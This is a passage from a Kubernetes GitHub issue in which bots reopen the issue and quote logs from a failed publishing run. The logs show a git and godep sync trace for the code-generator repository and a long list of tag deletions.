progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 0ab89e584187c20cc7c1a3f30db69f3b4ab64196\n>    \t+ git branch -D release-1.10\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/release-1.10\n>    \t+ echo 'Switching to origin/release-1.10.'\n>    \t+ git branch -f release-1.10 origin/release-1.10\n>    \t+ git checkout -q release-1.10\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/release-1.10\n>    \t+ UPSTREAM_HASH=6d34b425cfe0dd24279c4b80b2b3621d3a11b477\n>    \t+ '[' 6d34b425cfe0dd24279c4b80b2b3621d3a11b477 '!=' a963fce72fed31bdcf65502884f25ee2cdfaf9e1 ']'\n>    \t+ echo 'Upstream branch upstream/release-1.10 moved from '\\''a963fce72fed31bdcf65502884f25ee2cdfaf9e1'\\'' to '\\''6d34b425cfe0dd24279c4b80b2b3621d3a11b477'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/code-generator release-1.10 release-1.10 '' '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/code-generator\n>    \t+ local src_branch=release-1.10\n>    \t+ local dst_branch=release-1.10\n>    \t+ local deps=\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 14 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing release-1.10 commit 9de8e796a74d16d2a285165727d04c185ebca6dc.'\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/release-1.10\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit 6d34b425cfe0dd24279c4b80b2b3621d3a11b477.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit release-1.10\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B release-1.10\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_base_commit=8959a0aa87adf07c4ff821bf6d79714b3d615e8a\n>    \t+ '[' -z 8959a0aa87adf07c4ff821bf6d79714b3d615e8a ']'\n>    \t++ git-find-merge 8959a0aa87adf07c4ff821bf6d79714b3d615e8a upstream/release-1.10\n>    \t++ tail -1\n>    \t+++ git rev-list '8959a0aa87adf07c4ff821bf6d79714b3d615e8a^1..upstream/release-1.10' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 8959a0aa87adf07c4ff821bf6d79714b3d615e8a..upstream/release-1.10 --ancestry-path\n>    \t+++ git rev-parse 8959a0aa87adf07c4ff821bf6d79714b3d615e8a\n>    \t+ local k_base_merge=8959a0aa87adf07c4ff821bf6d79714b3d615e8a\n>    \t+ '[' -z 8959a0aa87adf07c4ff821bf6d79714b3d615e8a ']'\n>    \t+ git branch -f filtered-branch-base 8959a0aa87adf07c4ff821bf6d79714b3d615e8a\n>    \t+ echo 'Rewriting upstream branch release-1.10 to only include commits for staging/src/k8s.io/code-generator.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/code-generator 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/code-generator\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/code-generator -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=fe40e032bcfe504e871c80cf0ca8de994ab45668\n>    \t++ git log --first-parent --format=%H --reverse fe40e032bcfe504e871c80cf0ca8de994ab45668..HEAD\n>    \t+ f_mainline_commits=\n>    \t+ echo 'Checking out branch release-1.10.'\n>    \t+ git checkout -q release-1.10\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=9de8e796a74d16d2a285165727d04c185ebca6dc\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=9de8e796a74d16d2a285165727d04c185ebca6dc\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' 9de8e796a74d16d2a285165727d04c185ebca6dc '!=' 9de8e796a74d16d2a285165727d04c185ebca6dc ']'\n>    \t+ '[' false = true ']'\n>    \t+ fix-godeps '' '' k8s.io false true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=9de8e796a74d16d2a285165727d04c185ebca6dc\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>    \t+ local deps=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/code-generator\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \tgodep: error downloading dep (gopkg.in/yaml.v2): unrecognized import path \"gopkg.in/yaml.v2\"\n>    \tgodep: Error downloading some deps. Aborting restore and check.\n>\n>[11 Sep 18 15:34 UTC]: exit status 1```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-422741799):\n\n>/reopen\n>\n>The last publishing run failed: exit status 1\n>```\n>...ecause kFirstParentCommits lacks target \"e484b37cb2476c5a61d1ced880e943b07feb007d\"\n>\tDeleting tag v1.8.6 because kFirstParentCommits lacks target \"6260bb08c46c31eea6cb538b34a9ceb3e406689c\"\n>\tDeleting tag v1.9.4-beta.0 because kFirstParentCommits lacks target \"1e18dc6e2eb8a4b830fed01f0825641b76bf8c19\"\n>\tDeleting tag v0.14.1 because kFirstParentCommits lacks target \"77775a61b8e908acf6a0b08671ec1c53a3bc7fd2\"\n>\tDeleting tag v0.8.2 because kFirstParentCommits lacks target \"5b046406a957a1e7eda7c0c86dd7a89e9c94fc5f\"\n>\tDeleting tag v1.1.2-beta.0 because kFirstParentCommits lacks target \"e2b05d6b2a66f4fa55ca51baa6e11713ab0407be\"\n>\tDeleting tag v1.5.9-beta.0 because kFirstParentCommits lacks target \"f35802d3a00b37a32476451266af05ce9760fec0\"\n>\tDeleting tag v1.1.1-beta.0 because kFirstParentCommits lacks target \"7d6c8b640f2e90cf2347fb46ef4cf46cd3280015\"\n>\tDeleting tag v1.3.0-beta.3 because kFirstParentCommits lacks target \"a303f87b3366bc89b96c88b5d6d9edd3eda418e7\"\n>\tDeleting tag v1.8.1 because kFirstParentCommits lacks target \"f38e43b221d08850172a9a4ea785a86a3ffa3b3a\"\n>\tDeleting tag v0.21.0 because kFirstParentCommits lacks target \"39b013a5d5fb09b5bb7236b553dfa189f8884bbd\"\n>\tDeleting tag v1.6.3-beta.0 because kFirstParentCommits lacks target \"a5dec22fe9062288a6c79ef77cc5cfdd0f9c7a89\"\n>\tDeleting tag v1.6.5-beta.0 because kFirstParentCommits lacks target \"00fb653e406a4b5bbac71a10c3e330afef960f13\"\n>\tDeleting tag v1.11.3-beta.0 because kFirstParentCommits lacks target \"7abbb2db1b31540e68e6dc9e126b57c9eae8d1fd\"\n>\tDeleting tag v1.4.8-beta.0 because kFirstParentCommits lacks target \"ba5b2fcee9d938dae74d4474f68d9d0933f3ec04\"\n>\tDeleting tag v1.6.0-beta.2 because kFirstParentCommits lacks target \"8af9c3e53bc2c508d9948cb511372057339656f1\"\n>\tDeleting tag v1.7.0-beta.2 because kFirstParentCommits lacks target \"ceab7f7a6753c20d3be75463b17402fdcea856ba\"\n>\tDeleting tag v0.19.0 because kFirstParentCommits lacks target \"6b0d4ffed36adb0e2585333f01a553ab3e0970fd\"\n>\tDeleting tag v0.9.1 because kFirstParentCommits lacks target \"3623a01bf0e90de6345147eef62894057fe04b29\"\n>\tDeleting tag v0.9.2 because kFirstParentCommits lacks target \"013a97ea6e2a143f763035defdbcbcdc1b6d3411\"\n>\tDeleting tag v1.4.0-beta.6 because kFirstParentCommits lacks target \"a77bafdcb39e7a854f22ab73136ab7f0907293c0\"\n>\tDeleting tag v1.6.3-beta.1 because kFirstParentCommits lacks target \"7fc0617cf892e6d89de9b39ee151be98e52e4843\"\n>\tDeleting tag v1.3.2-beta.0 because kFirstParentCommits lacks target \"4e6ee9200183d6bd50061c2ae4270542cbb292c2\"\n>\tDeleting tag v1.6.9 because kFirstParentCommits lacks target \"a3d1dfa6f433575ce50522888a0409397b294c7b\"\n>\tDeleting tag v1.8.0-rc.1 because kFirstParentCommits lacks target \"c8a2429cb355d357d90174d3744a930dbd0bbff6\"\n>\tDeleting tag v0.5.6 because kFirstParentCommits lacks target \"55fa22c3236317154208119b3d2e0cfbfde59efc\"\n>\tDeleting tag v1.2.0 because kFirstParentCommits lacks target \"5cb86ee022267586db386f62781338b0483733b3\"\n>\tDeleting tag v1.2.6-beta.0 because kFirstParentCommits lacks target \"4996ab3b1cb116b906b23633d1796dc2954dd440\"\n>\tDeleting tag v0.9.0 because kFirstParentCommits lacks target \"96af0c3e5bac4c07635ac3653724c0721ed64403\"\n>\tDeleting tag v1.0.0 because kFirstParentCommits lacks target \"cd821444dcf3e1e237b5f3579721440624c9c4fa\"\n>\tDeleting tag v1.3.1-beta.1 because kFirstParentCommits lacks target \"1b854806c6ed2841f41896dc87268b599d180d8b\"\n>\tDeleting tag v1.5.5-beta.0 because kFirstParentCommits lacks target \"00a1fb254bd8e5235575fba1398b958943e39078\"\n>\tDeleting tag v0.16.2 because kFirstParentCommits lacks target \"72a6a948403654c9943920f47bd2ebdece391594\"\n>\tDeleting tag v1.1.0-beta because kFirstParentCommits lacks target \"7d6c8b640f2e90cf2347fb46ef4cf46cd3280015\"\n>\tDeleting tag v1.6.6 because kFirstParentCommits lacks target \"7fa1c1756d8bc963f1a389f4a6937dc71f08ada2\"\n>\tDeleting tag v1.1.6-beta.0 because kFirstParentCommits lacks target \"f7636d888c1b61158761d1e9a7b8c3f4a12305f3\"\n>\tDeleting tag v1.2.2 because kFirstParentCommits lacks target \"528f879e7d3790ea4287687ef0ab3f2a01cc2718\"\n>\tDeleting tag v1.1.3 because kFirstParentCommits lacks target \"6a81b50c7e97bbe0ade075de55ab4fa34f049dc2\"\n>\tDeleting tag v0.16.0 because kFirstParentCommits lacks target \"2cea8f22b38b3f7da9a5a018713f69103ed2689f\"\n>\tDeleting tag v1.4.0-beta.7 because kFirstParentCommits lacks target \"83f83ea41e72eeddc58f70f1ec77435ea1739140\"\n>\tDeleting tag v1.2.7 because kFirstParentCommits lacks target \"902de86715861baef02be82fb64d059230e52c2f\"\n>\tDeleting tag v1.8.0-beta.1 because kFirstParentCommits lacks target \"8c025bc2f23a3be059bf9a7d05867a8cb6f52ea8\"\n>\tDeleting tag v1.8.7-beta.0 because kFirstParentCommits lacks target \"01eda531869e7c39faadf9bdc4dfbbb17fa520da\"\n>\tDeleting tag v1.11.0-rc.1 because kFirstParentCommits lacks target \"8745ea56e3f1f3ad20050c1762eb6ba6f7786675\"\n>\tDeleting tag v1.3.0-beta.0 because kFirstParentCommits lacks target \"a4f439eb6d6e8086cb19d1d991a3256c4399f669\"\n>\tDeleting tag v1.7.10 because kFirstParentCommits lacks target \"bebdeb749f1fa3da9e1312c4b08e439c404b3136\"\n>\tDeleting tag v1.7.13-beta.0 because kFirstParentCommits lacks target \"dc929bb842500f4940d7555e712d7319924e8434\"\n>\tDeleting tag v1.3.4 because kFirstParentCommits lacks target \"dd6b458ef8dbf24aff55795baa68f83383c9b3a9\"\n>\tDeleting tag v1.5.2 because kFirstParentCommits lacks target \"08e099554f3c31f6e6f07b448ab3ed78d0520507\"\n>\tDeleting tag v1.5.8-beta.0 because kFirstParentCommits lacks target \"f07eea23494be1e7c11a8e2cf51bd96d1ec9fdf1\"\n>\tDeleting tag v1.8.13 because kFirstParentCommits lacks target \"290fb182489a396dce5d136451388f9b12f29c94\"\n>\tDeleting tag v1.3.10 because kFirstParentCommits lacks target \"c3e367ec9eae7338ac4e2a57f293634891319b7c\"\n>\tDeleting tag v1.4.6 because kFirstParentCommits lacks target \"e569a27d02001e343cb68086bc06d47804f62af6\"\n>\tDeleting tag v1.6.0-beta.0 because kFirstParentCommits lacks target \"609565b477c2b0059a01cb4a7ac538f80a469fb9\"\n>\tDeleting tag v1.8.0-beta.0 because kFirstParentCommits lacks target \"86c94a3a8ee583782c85a1bb676fa22d138d4cec\"\n>\tDeleting tag v0.11.0 because kFirstParentCommits lacks target \"18ddff0eb6bc069b41832ce47d19b5b89cfb26e3\"\n>\tDeleting tag v1.8.3 because kFirstParentCommits lacks target \"f0efb3cb883751c5ffdbe6d515f3cb4fbe7b7acd\"\n>\tDeleting tag v0.7.2 because kFirstParentCommits lacks target \"0d6131bbcd6682d0e51eefc0e439e5dcbbf511b1\"\n>\tDeleting tag v1.8.11 because kFirstParentCommits lacks target \"1df6a8381669a6c753f79cb31ca2e3d57ee7c8a3\"\n>\tDeleting tag v0.14.0 because kFirstParentCommits lacks target \"575bf6dcd09c84cb6622db3605cbc3abdb4e1baa\"\n>\tDeleting tag v1.1.2 because kFirstParentCommits lacks target \"3085895b8a70a3d985e9320a098e74f545546171\"\n>\tDeleting tag v1.11.2 because kFirstParentCommits lacks target \"bb9ffb1654d4a729bb4cec18ff088eacc153c239\"\n>\tDeleting tag v1.4.0-beta.11 because kFirstParentCommits lacks target \"4b28af1232cc52da453eb4ebe3dc001314a1f99b\"\n>\tDeleting tag v1.5.0-beta.3 because kFirstParentCommits lacks target \"35fd1363821b8432ccde55632cf9ead4c79eddbb\"\n>\tDeleting tag v1.8.6-beta.0 because kFirstParentCommits lacks target \"a54776dcd19445353d7f9516a498f1e9e3ef708c\"\n>\tDeleting tag v1.3.7-beta.0 because kFirstParentCommits lacks target \"0eaf484c0ac0007d66bf0c454cdfa02e7acafb51\"\n>\tDeleting tag v0.18.1 because kFirstParentCommits lacks target \"befd1385e5af5f7516f75a27a2628272bb9e9f36\"\n>\tDeleting tag v0.8.1 because kFirstParentCommits lacks target \"a137096158b3aa55f4e8e1140140d14e7cb68e7e\"\n>\tDeleting tag v1.10.7-beta.0 because kFirstParentCommits lacks target \"75e0f58bf8db10f9e743ce5fab3016c0a2b1f715\"\n>\tDeleting tag v1.10.9-beta.0 because kFirstParentCommits lacks target \"fb9ee95979e6e504a84d3c6f5df07a9bfa461fa7\"\n>\tDeleting tag v1.2.4-beta.0 because kFirstParentCommits lacks target \"b14ae23f32077d8911f88bc47ab15842fb93b339\"\n>\tDeleting tag v1.4.3-beta.0 because kFirstParentCommits lacks target \"401e0bdd0fef2f9184a6fb23d131d9695d10c9fe\"\n>\tDeleting tag v1.5.4 because kFirstParentCommits lacks target \"7243c69eb523aa4377bce883e7c0dd76b84709a1\"\n>\tDeleting tag v0.4.3 because kFirstParentCommits lacks target \"7c1f83e71b2238f4656e56365edc49e87ef25a3b\"\n>\tDeleting tag v0.5.2 because kFirstParentCommits lacks target \"97fce8bb4b70e74c2bcf1f5745da521faa77d580\"\n>\tDeleting tag v1.1.1-beta.1 because kFirstParentCommits lacks target \"d3071cbd760a8f8650ff379398c59e71ffcf7085\"\n>\tDeleting tag v1.9.0 because kFirstParentCommits lacks target \"925c127ec6b946659ad0fd596fa959be43f0cc05\"\n>\tDeleting tag v0.3 because kFirstParentCommits lacks target \"89eff1d0d88d62b5b34512a162a3affb513479e5\"\n>\tDeleting tag v1.6.5 because kFirstParentCommits lacks target \"490c6f13df1cb6612e0993c4c14f2ff90f8cdbf3\"\n>\tDeleting tag v1.0.5 because kFirstParentCommits lacks target \"843c2c5d65278d57d138ff689b7de5151f058570\"\n>\tDeleting tag v1.10.0-beta.2 because kFirstParentCommits lacks target \"63dad40a0391b7af32c34fdbf41fa199c3b247ad\"\n>\tDeleting tag v1.10.5-beta.0 because kFirstParentCommits lacks target \"17538dc72bd07c34c0d15d93bf0c025fdddd92a9\"\n>\tDeleting tag v1.1.7 because kFirstParentCommits lacks target \"e4e6878293a339e4087dae684647c9e53f1cf9f0\"\n>\tDeleting tag v1.10.2 because kFirstParentCommits lacks target \"81753b10df112992bf51bbc2c2f85208aad78335\"\n>\tDeleting tag v1.0.6 because kFirstParentCommits lacks target \"388061f00f0d9e4d641f9ed4971c775e1654579d\"\n>\tDeleting tag v1.2.5-beta.0 because kFirstParentCommits lacks target \"3d6adabd365ed5f81a2a3b843c63626c27e4034d\"\n>\tDeleting tag v1.5.0-beta.0 because kFirstParentCommits lacks target \"82c2538cf7541383a3d203e1d850331a507bc80c\"\n>\tDeleting tag v1.5.6-beta.0 because kFirstParentCommits lacks target \"21f5c4d2561bec76d275959b98273c52af247acd\"\n>\tDeleting tag v1.6.2-beta.0 because kFirstParentCommits lacks target \"aaf9ea07f519a2c3f4769dc8d10b807ad1a8d279\"\n>\tDeleting tag v0.18.2 because kFirstParentCommits lacks target \"1f12b893876ad6c41396222693e37061f6e80fe1\"\n>\tDeleting tag v1.4.0-beta.9 because kFirstParentCommits lacks target \"dfce7e639b341a13a1b6c8c1c52517949772b650\"\n>\tDeleting tag v1.4.2 because kFirstParentCommits lacks target \"c072cc2ee4dfc21b60196e5994c56c40e1c29b93\"\n>\tDeleting tag v1.10.0-rc.1 because kFirstParentCommits lacks target \"2106a5910f6de3c07b8f329c7adaca38a0d3f825\"\n>\tDeleting tag v0.5.1 because kFirstParentCommits lacks target \"3c409cdf2636ff225682d8f3aaff44fbfa5abb21\"\n>\tDeleting tag v0.21.1 because kFirstParentCommits lacks target \"906122a279abbfa7f54e8dbf3ea06aac3bf89fac\"\n>\tDeleting tag v0.7.1 because kFirstParentCommits lacks target \"57779efb8d52c2650d96b8399172f968a0dd71c1\"\n>\tDeleting tag v1.9.9 because kFirstParentCommits lacks target \"57729ea3d9a1b75f3fc7bbbadc597ba707d47c8a\"\n>\tDeleting tag v1.5.7-beta.0 because kFirstParentCommits lacks target \"ea8f6637b639246faa14a8d5c6f864100fcb77a9\"\n>\tDeleting tag v1.6.13-beta.0 because kFirstParentCommits lacks target \"dfe33e3ee55435346930cc1f1be523ccce2a4b0d\"\n>\tDeleting tag v1.8.4-beta.0 because kFirstParentCommits lacks target \"89ffe7ab5ddbad9359fbe7d24f2b72c6ee59ee5d\"\n>\tDeleting tag v1.8.7 because kFirstParentCommits lacks target \"b30876a5539f09684ff9fde266fda10b37738c9c\"\n>\tDeleting tag v1.2.3 because kFirstParentCommits lacks target \"882d296a99218da8f6b2a340eb0e81c69e66ecc7\"\n>\tDeleting tag v1.4.7 because kFirstParentCommits lacks target \"92b4f971662de9d8770f8dcd2ee01ec226a6f6c0\"\n>\tDeleting tag v1.4.0 because kFirstParentCommits lacks target \"a16c0a7f71a6f93c7e0f222d961f4675cd97a46b\"\n>\tDeleting tag v1.7.14 because kFirstParentCommits lacks target \"d1303b003001cf2b5b8cec099383125096b3dac0\"\n>\tDeleting tag v1.9.9-beta.0 because kFirstParentCommits lacks target \"39c05abe015b487427c4fc496c82032c310ae83f\"\n>\tDeleting tag v1.8.2 because kFirstParentCommits lacks target \"bdaeafa71f6c7c04636251031f93464384d54963\"\n>\tDeleting tag v0.12.1 because kFirstParentCommits lacks target \"7a98dc0145574f79409f6051b2b1fe8da9d2df47\"\n>\tDeleting tag v1.8.16-beta.0 because kFirstParentCommits lacks target \"a758e266dc23d4bdfb7ba56dfd7a3babf4d86e8a\"\n>\tDeleting tag v1.10.0-beta.3 because kFirstParentCommits lacks target \"6908cc4291744523ded203e6a5358a2645c43a3d\"\n>\tDeleting tag v1.6.0 because kFirstParentCommits lacks target \"fff5156092b56e6bd60fff75aad4dc9de6b6ef37\"\n>\tDeleting tag v1.4.6-beta.0 because kFirstParentCommits lacks target \"39df7e7ef8b5087b34ff7351f1b7fc1bcc128716\"\n>\tDeleting tag v1.4.9 because kFirstParentCommits lacks target \"844ef259fa9ec2228d8b5ef5a211da4fa9a5fae4\"\n>\tDeleting tag v1.6.13 because kFirstParentCommits lacks target \"14ea65f53cdae4a5657cf38cfc8d7349b75b5512\"\n>\tDeleting tag v1.6.9-beta.0 because kFirstParentCommits lacks target \"67b88532642baccc341a2a086de10fe16cf59a60\"\n>\tDeleting tag v1.7.0 because kFirstParentCommits lacks target \"d3ada0119e776222f11ec7945e6d860061339aad\"\n>\tDeleting tag v0.12.2 because kFirstParentCommits lacks target \"e7aa07fd75c9efa68f25abe4c5b735681cfac6c5\"\n>\tDeleting tag v1.2.8-beta.0 because kFirstParentCommits lacks target \"5efd74fa52f4bf7ea27d4c1ec49a97b1090994ef\"\n>\tDeleting tag v1.4.0-beta.1 because kFirstParentCommits lacks target \"f7b03a3287b5a2c47cd7fad379b48df01036ce34\"\n>\tDeleting tag v1.10.6-beta.0 because kFirstParentCommits lacks target \"6d637ae4bacdd1506aba496ebcef7d94e8f2e9c5\"\n>\tDeleting tag v1.11.0-beta.0 because kFirstParentCommits lacks target \"c3c52634ebd2a1534c0506484f611a43f1f0a8bf\"\n>\tDeleting tag v1.3.8-beta.0 because kFirstParentCommits lacks target \"17d4cf1af43a03a5997ea9142b19e5b1ac2d8747\"\n>\tDeleting tag v1.7.0-beta.0 because kFirstParentCommits lacks target \"e3db58e39a3ff1012efdf646c727278b82299c5e\"\n>\tDeleting tag v1.1.0 because kFirstParentCommits lacks target \"7d6c8b640f2e90cf2347fb46ef4cf46cd3280015\"\n>\tDeleting tag v1.1.5 because kFirstParentCommits lacks target \"2154ee7e71be6e290db2fc50440cfd967852f252\"\n>\tDeleting tag v1.8.1-beta.0 because kFirstParentCommits lacks target \"49f4ebfd7400c556575c4c8708c6c3cd5c71d8b1\"\n>\tDeleting tag v1.7.4 because kFirstParentCommits lacks target \"793658f2d7ca7f064d2bdf606519f9fe1229c381\"\n>\tDeleting tag v1.9.2-beta.0 because kFirstParentCommits lacks target \"c6943de13b44f8795b10769e651ac17c3994f147\"\n>\tDeleting tag v1.3.5-beta.0 because kFirstParentCommits lacks target \"a0bfee0d3899d2b91530552a536405c1fe1a1d2a\"\n>\tDeleting tag v1.7.0-beta.3 because kFirstParentCommits lacks target \"594edb773975124b137fa12bc573478a0355e89c\"\n>\tDeleting tag v1.7.15-beta.0 because kFirstParentCommits lacks target \"91ad850d0165f8262fe71e07fa0da4707c05d846\"\n>\tDeleting tag v1.9.10-beta.0 because kFirstParentCommits lacks target \"89931d34801f98e8ccf2f5f20c09918717e52742\"\n>\tDeleting tag v0.19.1 because kFirstParentCommits lacks target \"bb63f031d4146c17113b059886aea66b09f6daf5\"\n>\tDeleting tag v1.1.3-beta.0 because kFirstParentCommits lacks target \"d5e7fd774674a002474938bfdaa3481b5e12c385\"\n>\tDeleting tag v1.11.3 because kFirstParentCommits lacks target \"a4529464e4629c21224b3d52edfe0ea91b072862\"\n>\tDeleting tag v1.8.9-beta.0 because kFirstParentCommits lacks target \"5722a8ab9d1dfd873914a4ffc5dcb790ad961f87\"\n>\tDeleting tag v1.1.8-beta.0 because kFirstParentCommits lacks target \"4309194eda6bfd4db0cc28f46cacabe1719979d7\"\n>\tDeleting tag v1.5.3 because kFirstParentCommits lacks target \"029c3a408176b55c30846f0faedf56aae5992e9b\"\n>\tDeleting tag v1.6.1 because kFirstParentCommits lacks target \"b0b7a323cc5a4a2019b2e9520c21c7830b7f708e\"\n>\tDeleting tag v1.7.10-beta.0 because kFirstParentCommits lacks target \"9e7b2a6b1195703a51a413701e84ebe37521df81\"\n>\tDeleting tag v1.1.4-beta.0 because kFirstParentCommits lacks target \"8dec957e4bba8b1260995d525a8260e03acbc181\"\n>\tDeleting tag v1.2.1 because kFirstParentCommits lacks target \"50809107cd47a1f62da362bccefdd9e6f7076145\"\n>\tDeleting tag v1.4.11-beta.0 because kFirstParentCommits lacks target \"72c792b810397eaa7ca8fae44badef4d8b043369\"\n>\tDeleting tag v0.4.1 because kFirstParentCommits lacks target \"dc865a4d5008984abbcd77fc3c218e9176572937\"\n>\tDeleting tag v1.2.0-beta.1 because kFirstParentCommits lacks target \"77eff081f022242e5736b8c2e1ca2058ca61a733\"\n>\tDeleting tag v1.3.10-beta.0 because kFirstParentCommits lacks target \"22b167b166e60b5634429cc42f16ad40a6c15e52\"\n>\tDeleting tag v1.7.5-beta.0 because kFirstParentCommits lacks target \"d090cd0e2bf432034b42de5d098d999bc99de043\"\n>\tDeleting tag v1.8.15-beta.0 because kFirstParentCommits lacks target 